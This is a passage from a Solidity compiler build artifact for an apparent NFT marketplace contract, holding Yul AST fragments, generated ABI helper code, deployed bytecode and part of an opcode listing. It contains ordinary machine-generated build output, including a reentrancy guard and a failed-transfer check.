call"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"9355:6:15"},"nodeType":"YulFunctionCall","src":"9355:57:15"},"nodeType":"YulExpressionStatement","src":"9355:57:15"}]},"name":"store_literal_in_memory_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"9336:6:15","type":""}],"src":"9238:181:15"},{"body":{"nodeType":"YulBlock","src":"9468:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"9525:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"9534:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"9537:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"9527:6:15"},"nodeType":"YulFunctionCall","src":"9527:12:15"},"nodeType":"YulExpressionStatement","src":"9527:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"9491:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"9516:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"9498:17:15"},"nodeType":"YulFunctionCall","src":"9498:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"9488:2:15"},"nodeType":"YulFunctionCall","src":"9488:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"9481:6:15"},"nodeType":"YulFunctionCall","src":"9481:43:15"},"nodeType":"YulIf","src":"9478:63:15"}]},"name":"validator_revert_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"9461:5:15","type":""}],"src":"9425:122:15"},{"body":{"nodeType":"YulBlock","src":"9596:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"9653:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"9662:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"9665:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"9655:6:15"},"nodeType":"YulFunctionCall","src":"9655:12:15"},"nodeType":"YulExpressionStatement","src":"9655:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"9619:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"9644:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"9626:17:15"},"nodeType":"YulFunctionCall","src":"9626:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"9616:2:15"},"nodeType":"YulFunctionCall","src":"9616:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"9609:6:15"},"nodeType":"YulFunctionCall","src":"9609:43:15"},"nodeType":"YulIf","src":"9606:63:15"}]},"name":"validator_revert_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"9589:5:15","type":""}],"src":"9553:122:15"}]},"contents":"{\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2 {\n        if slt(sub(dataEnd, headStart), 96) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 15)\n        store_literal_in_memory_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 31)\n        store_literal_in_memory_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619(pos)\n        end := add(pos, 32)\n    }\n\n    // struct NftMarketplace.Listing -> struct NftMarketplace.Listing\n    function abi_encode_t_struct$_Listing_$2632_memory_ptr_to_t_struct$_Listing_$2632_memory_ptr_fromStack(value, pos)  {\n        let tail := add(pos, 0x40)\n\n        {\n            // price\n\n            let memberValue0 := mload(add(value, 0x00))\n            abi_encode_t_uint256_to_t_uint256(memberValue0, add(pos, 0x00))\n        }\n\n        {\n            // seller\n\n            let memberValue0 := mload(add(value, 0x20))\n            abi_encode_t_address_to_t_address(memberValue0, add(pos, 0x20))\n        }\n\n    }\n\n    function abi_encode_t_uint256_to_t_uint256(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_struct$_Listing_$2632_memory_ptr__to_t_struct$_Listing_$2632_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_struct$_Listing_$2632_memory_ptr_to_t_struct$_Listing_$2632_memory_ptr_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function store_literal_in_memory_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51(memPtr) {\n\n        mstore(add(memPtr, 0), \"Transfer failed\")\n\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function store_literal_in_memory_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619(memPtr) {\n\n        mstore(add(memPtr, 0), \"ReentrancyGuard: reentrant call\")\n\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"6080604052600436106100705760003560e01c80639038e6931161004e5780639038e693146101185780639f37092a1461012f578063b2ddee061461014b578063f772adf11461017457610070565b806330cfeda91461007557806388700d1c146100b257806389bfd38f146100ef575b600080fd5b34801561008157600080fd5b5061009c6004803603810190610097919061135a565b61019d565b6040516100a99190611622565b60405180910390f35b3480156100be57600080fd5b506100d960048036038101906100d491906113b4565b6101e6565b6040516100e69190611607565b60405180910390f35b3480156100fb57600080fd5b50610116600480360381019061011191906113f4565b6102b1565b005b34801561012457600080fd5b5061012d610727565b005b610149600480360381019061014491906113b4565b61089a565b005b34801561015757600080fd5b50610172600480360381019061016d91906113b4565b610c87565b005b34801561018057600080fd5b5061019b600480360381019061019691906113f4565b610f76565b005b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6101ee6112eb565b600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000838152602001908152602001600020604051806040016040529081600082015481526020016001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525050905092915050565b82826000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000838152602001908152602001600020604051806040016040529081600082015481526020016001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152505090506000816000015111156103be5782826040517f4a5568d50000000000000000000000000000000000000000000000000000000081526004016103b5929190611567565b60405180910390fd5b858533600083905060008173ffffffffffffffffffffffffffffffffffffffff16636352211e856040518263ffffffff1660e01b81526004016104019190611622565b60206040518083038186803b15801561041957600080fd5b505afa15801561042d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104519190611387565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146104b8576040517f30cd747100000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600089116104f2576040517fe1abbfc500000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b60008b90503073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1663081812fc8d6040518263ffffffff1660e01b81526004016105479190611622565b60206040518083038186803b15801561055f57600080fd5b505afa158015610573573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105979190611387565b73ffffffffffffffffffffffffffffffffffffffff16146105e4576040517f4be3a2c500000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b60405180604001604052808b81526020013373ffffffffffffffffffffffffffffffffffffffff16815250600160008e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008d81526020019081526020016000206000820151816000015560208201518160010160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055509050508a8c73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fd547e933094f12a9159076970143ebe73234e64480317844b0dcb36117116de48d6040516107119190611622565b60405180910390a4505050505050505050505050565b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081116107a5576040517fc4d8fa8700000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff16826040516108109061151b565b60006040518083038185875af1925050503d806000811461084d576040519150601f19603f3d011682016040523d82523d6000602084013e610852565b606091505b5050905080610896576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088d906115c7565b60405180910390fd5b5050565b81816000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000838152602001908152602001600020604051806040016040529081600082015481526020016001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525050905060008160000151116109a65782826040517f6831488c00000000000000000000000000000000000000000000000000000000815260040161099d929190611567565b60405180910390fd5b6109ae611291565b6000600160008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000868152602001908152602001600020604051806040016040529081600082015481526020016001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152505090508060000151341015610abe57858582600001516040517f7c934565000000000000000000000000000000000000000000000000000000008152600401610ab593929190611590565b60405180910390fd5b3460026000836020015173ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610b119190611659565b92505081905550600160008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008681526020019081526020016000206000808201600090556001820160006101000a81549073ffffffffffffffffffffffffffffffffffffffff021916905550508573ffffffffffffffffffffffffffffffffffffffff166342842e0e826020015133886040518463ffffffff1660e01b8152600401610bdb93929190611530565b600060405180830381600087803b158015610bf557600080fd5b505af1158015610c09573d6000803e3d6000fd5b50505050848673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f263223b1dd81e51054a4e6f791d45a4a1ddb4aadcd93a2dfd892615c3fdac1878460000151604051610c6f9190611622565b60405180910390a450610c806112e1565b5050505050565b818133600083905060008173ffffffffffffffffffffffffffffffffffffffff16636352211e856040518263ffffffff1660e01b8152600401610cca9190611622565b60206040518083038186803b158015610ce257600080fd5b505afa158015610cf6573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d1a9190611387565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614610d81576040517f30cd747100000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b86866000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000838152602001908152602001600020604051806040016040529081600082015481526020016001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152505090506000816000015111610e8d5782826040517f6831488c000000000000000000000000000000000000000000000000000000008152600401610e84929190611567565b60405180910390fd5b600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a81526020019081526020016000206000808201600090556001820160006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690555050888a73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f9ba1a3cb55ce8d63d072a886f94d2a744f50cddf82128e897d0661f5ec62315860405160405180910390a450505050505050505050565b82826000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000838152602001908152602001600020604051806040016040529081600082015481526020016001820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525050905060008160000151116110825782826040517f6831488c000000000000000000000000000000000000000000000000000000008152600401611079929190611567565b60405180910390fd5b61108a611291565b858533600083905060008173ffffffffffffffffffffffffffffffffffffffff16636352211e856040518263ffffffff1660e01b81526004016110cd9190611622565b60206040518083038186803b1580156110e557600080fd5b505afa1580156110f9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061111d9190611387565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614611184576040517f30cd747100000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600089116111be576040517fe1abbfc500000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b88600160008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008c815260200190815260200160002060000181905550898b73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fd547e933094f12a9159076970143ebe73234e64480317844b0dcb36117116de48c6040516112749190611622565b60405180910390a450505050506112896112e1565b505050505050565b600260005414156112d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016112ce906115e7565b60405180910390fd5b6002600081905550565b6001600081905550565b604051806040016040528060008152602001600073ffffffffffffffffffffffffffffffffffffffff1681525090565b60008135905061132a81611774565b92915050565b60008151905061133f81611774565b92915050565b6000813590506113548161178b565b92915050565b6000602082840312156113705761136f61171a565b5b600061137e8482850161131b565b91505092915050565b60006020828403121561139d5761139c61171a565b5b60006113ab84828501611330565b91505092915050565b600080604083850312156113cb576113ca61171a565b5b60006113d98582860161131b565b92505060206113ea85828601611345565b9150509250929050565b60008060006060848603121561140d5761140c61171a565b5b600061141b8682870161131b565b935050602061142c86828701611345565b925050604061143d86828701611345565b9150509250925092565b611450816116af565b82525050565b61145f816116af565b82525050565b6000611472600f83611648565b915061147d8261171f565b602082019050919050565b600061149560008361163d565b91506114a082611748565b600082019050919050565b60006114b8601f83611648565b91506114c38261174b565b602082019050919050565b6040820160008201516114e460008501826114fd565b5060208201516114f76020850182611447565b50505050565b611506816116e1565b82525050565b611515816116e1565b82525050565b600061152682611488565b9150819050919050565b60006060820190506115456000830186611456565b6115526020830185611456565b61155f604083018461150c565b949350505050565b600060408201905061157c6000830185611456565b611589602083018461150c565b9392505050565b60006060820190506115a56000830186611456565b6115b2602083018561150c565b6115bf604083018461150c565b949350505050565b600060208201905081810360008301526115e081611465565b9050919050565b60006020820190508181036000830152611600816114ab565b9050919050565b600060408201905061161c60008301846114ce565b92915050565b6000602082019050611637600083018461150c565b92915050565b600081905092915050565b600082825260208201905092915050565b6000611664826116e1565b915061166f836116e1565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156116a4576116a36116eb565b5b828201905092915050565b60006116ba826116c1565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600080fd5b7f5472616e73666572206661696c65640000000000000000000000000000000000600082015250565b50565b7f5265656e7472616e637947756172643a207265656e7472616e742063616c6c00600082015250565b61177d816116af565b811461178857600080fd5b50565b611794816116e1565b811461179f57600080fd5b5056fea26469706673582212200967bd9df82c5fdbe8296a22425ea397af320ac46e531d08b80204782b9a8cd364736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x70 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9038E693 GT PUSH2 0x4E JUMPI DUP1 PUSH4 0x9038E693 EQ PUSH2 0x118 JUMPI DUP1 PUSH4 0x9F37092A EQ PUSH2 0x12F JUMPI DUP1 PUSH4 0xB2DDEE06 EQ PUSH2 0x14B JUMPI DUP1 PUSH4 0xF772ADF1 EQ PUSH2 0x174 JUMPI PUSH2 0x70 JUMP JUMPDEST DUP1 PUSH4 0x30CFEDA9 EQ PUSH2 0x75 JUMPI DUP1 PUSH4 0x88700D1C EQ PUSH2 0xB2 JUMPI DUP1 PUSH4 0x89BFD38F EQ PUSH2 0xEF JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x81 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x97 SWAP2 SWAP1 PUSH2 0x135A JUMP JUMPDEST PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x1622 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xD4 SWAP2 SWAP1 PUSH2 0x13B4 JUMP JUMPDEST PUSH2 0x1E6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE6 SWAP2 SWAP1 PUSH2 0x1607 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x111 SWAP2 SWAP1 PUSH2 0x13F4 JUMP JUMPDEST PUSH2 0x2B1 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x124 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12D PUSH2 0x727 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x149 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x144 SWAP2 SWAP1 PUSH2 0x13B4 JUMP JUMPDEST PUSH2 0x89A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x157 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x172 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x16D SWAP2 SWAP1 PUSH2 0x13B4 JUMP JUMPDEST PUSH2 0xC87 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x180 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x196 SWAP2 SWAP1 PUSH2 0x13F4 JUMP JUMPDEST PUSH2 0xF76 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1EE PUSH2 0x12EB JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE SWAP1 DUP2 PUSH1 0x0 DUP3 ADD SLOAD DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x1 DUP3 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP3 PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD 